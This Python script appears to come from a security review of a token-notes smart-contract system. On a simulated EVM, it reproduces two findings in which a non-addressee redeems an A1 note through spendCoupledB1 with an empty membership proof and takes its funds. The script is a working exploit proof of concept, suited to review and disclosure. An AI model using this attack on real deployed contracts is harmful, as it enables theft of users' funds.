# Run: PYTHONPATH=. python scripts/review/evm_a1_via_b1.py [scratch]
"""Review findings 7 and 8, executed on a real EVM with a real spend SNARK.

Mint the committed A1 e2e note (addressed, public issuer).  Then a third
party Mallory, who is given only the A1 opening, generates a FRESH spend
proof that pays HER address, produces a B1 depositor binding on HER keys,
and calls spendCoupledB1 with an EMPTY membership proof.

The spend circuit does not constrain flavor, so the A1 opening is accepted
on the bearer path.  Empty membership skips the G1-tie check even though
the real adapter is wired.  BUCK is paid to Mallory, not the addressee.

Honest control: the same A1 spend proof still verifies off-chain for the
original recipient; the B1 path is the one that moves funds.
"""
import sys
from pathlib import Path

from web3 import Web3

from alberta_buck.sim.pyrevm_backend import PyrevmAnvil
from alberta_buck.sim.notes_stack import E2EFixture, NotesStack, ACCOUNT_STUB
from alberta_buck.review.examples import Account, seeded
from alberta_buck.review.integration import spend_prove
from alberta_buck.wallet.b1_binding import b1_bind_prove
from alberta_buck.wallet.bn254 import point_to_words

g1 = lambda P: tuple(point_to_words(P))

SCRATCH = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("/tmp/alberta-buck-a1-via-b1")
SCRATCH.mkdir(parents=True, exist_ok=True)

MALLORY_ADDR_INT = 0xBAD
MALLORY = Web3.to_checksum_address(f"0x{MALLORY_ADDR_INT:040x}")


def db_tuple(proof):
    return (proof.e, proof.s_m, proof.s_s, proof.s_r, proof.s_b,
            g1(proof.A2), g1(proof.A4), g1(proof.B1), g1(proof.B2),
            g1(proof.A_p), g1(proof.P_dep))


fx = E2EFixture.load("a1")
assert fx.opening.flavor == 1, "fixture must be A1"
mallory = Account(77777, 88888, 99999)

with PyrevmAnvil(chain_id=1, auto_impersonate=True, timestamp=1_700_000_000) as anvil:
    stack = NotesStack(anvil, fx, rng=seeded(42))
    stack.bind_identities()
    # Pyrevm will not originate a tx from an account that still has code
    # (Anvil impersonation allows it).  Binding already required a stub;
    # clear it so issuer/depositor can fund, approve and mint.
    for a in (fx.issuer.addr, fx.depositor.addr):
        anvil.set_code(stack._addr(a), "0x")
    stack.fund_issuer()
    stack.approve_pool(fx.issuer, 2 * fx.face, "approve issuer->pool")
    # Notes is a public carrying contract: payout to a public Mallory
    # does not need a CP fragment.  Bind Mallory as public.
    anvil.set_code(MALLORY, ACCOUNT_STUB)
    anvil.set_balance(MALLORY, 10**18)
    bind5 = stack._bind5
    stack.chain.send(
        bind5(MALLORY, g1(mallory.pk), (g1(mallory.E.R), g1(mallory.E.C)),
              True, False),
        sender=stack.gov)
    anvil.set_code(MALLORY, "0x")
    assert stack.reg.functions.isVerified(MALLORY).call()
    print("bound Mallory as a public verified identity (no KYC credential)")

    mint = stack.mint()
    print("minted A1 note; face =", fx.face, "tx", mint.txhash)

    # Fresh spend SNARK: same A1 opening, recipient redirected to Mallory.
    w = dict(fx.raw["spend"]["witness"])
    w["recipient"] = MALLORY_ADDR_INT
    # Keep flavor = 1 (A1).  Public inputs still omit flavor.
    assert int(w["flavor"]) == 1
    print("proving spend with A1 flavor, recipient = Mallory ...")
    proved = spend_prove(SCRATCH / "mallory-spend", w)
    proof = proved["proofBytes"]
    sp = fx.raw["spend"]["public"]
    root, nf, face = int(sp["noteRoot"]), int(sp["nullifier"]), int(sp["face"])

    # B1 depositor binding on Mallory's keys, naming the fixture issuer
    # (substitution of issuer is a separate assert below).
    b1_proof, e_dep = b1_bind_prove(
        mallory.m, mallory.sk, mallory.E, fx.issuer.pk,
        MALLORY_ADDR_INT, fx.chainid, rng=seeded(43))

    notes_bal_before = stack.buck.functions.balanceOf(stack.notes.address).call()
    mal_bal_before = stack.buck.functions.balanceOf(MALLORY).call()
    dep_addr = stack._addr(fx.depositor.addr)
    dep_bal_before = stack.buck.functions.balanceOf(dep_addr).call()

    fn = stack.notes.functions.spendCoupledB1(
        proof, root, nf, face, MALLORY, stack._addr(fx.issuer.addr),
        (g1(e_dep.R), g1(e_dep.C)), db_tuple(b1_proof),
        b"",   # empty membership: finding 8 fail-open
    )
    step = stack._send_from(fn, MALLORY, "Notes.spendCoupledB1(A1 opening)",
                            event="SpentCoupledB1", contract=stack.notes)

    mal_bal = stack.buck.functions.balanceOf(MALLORY).call()
    dep_bal = stack.buck.functions.balanceOf(dep_addr).call()
    notes_bal = stack.buck.functions.balanceOf(stack.notes.address).call()
    spent = stack.notes.functions.nullifiers(nf).call()
    print("FORGED B1 spend of A1 note accepted; tx", step.txhash)
    print("   empty membership proof skipped G1-tie (finding 8)")
    print("   flavor in witness = 1 (A1); entry point = spendCoupledB1 (finding 7)")
    print("   nullifier consumed =", spent)
    print("   Mallory delta BUCK =", mal_bal - mal_bal_before)
    print("   addressee delta BUCK =", dep_bal - dep_bal_before)
    print("   pool delta BUCK =", notes_bal - notes_bal_before)
    assert spent, "nullifier not consumed"
    assert mal_bal - mal_bal_before == face, "Mallory did not receive face"
    assert dep_bal == dep_bal_before, "addressee must not be paid"
    assert notes_bal_before - notes_bal == face

    # Issuer substitution: a second B1-shaped call cannot reuse the nullifier.
    # Demonstrate the binding accepts a different registered issuer independently.
    fake_iss = Web3.to_checksum_address("0x00000000000000000000000000000000000015e1")
    anvil.set_code(fake_iss, ACCOUNT_STUB)
    fake_acct = Account(13579, 24680, 11111)
    stack.chain.send(
        bind5(fake_iss, g1(fake_acct.pk), (g1(fake_acct.E.R), g1(fake_acct.E.C)),
              True, False),
        sender=stack.gov)
    sub_proof, sub_e = b1_bind_prove(
        mallory.m, mallory.sk, mallory.E, fake_acct.pk,
        MALLORY_ADDR_INT, fx.chainid, rng=seeded(44))
    ok_sub = stack.reg.functions.verifyDepositorBinding(
        MALLORY, fake_iss, (g1(sub_e.R), g1(sub_e.C)), db_tuple(sub_proof)).call()
    print("depositor binding verifies against a SUBSTITUTE issuer =", ok_sub)
    assert ok_sub

    print("\nRESULT: findings 7 and 8 reproduced on EVM with a real spend SNARK.")
    print("   An A1 opening was redeemed through spendCoupledB1 by a non-addressee;")
    print("   empty membership skipped the wired G1-tie verifier; BUCK moved.")
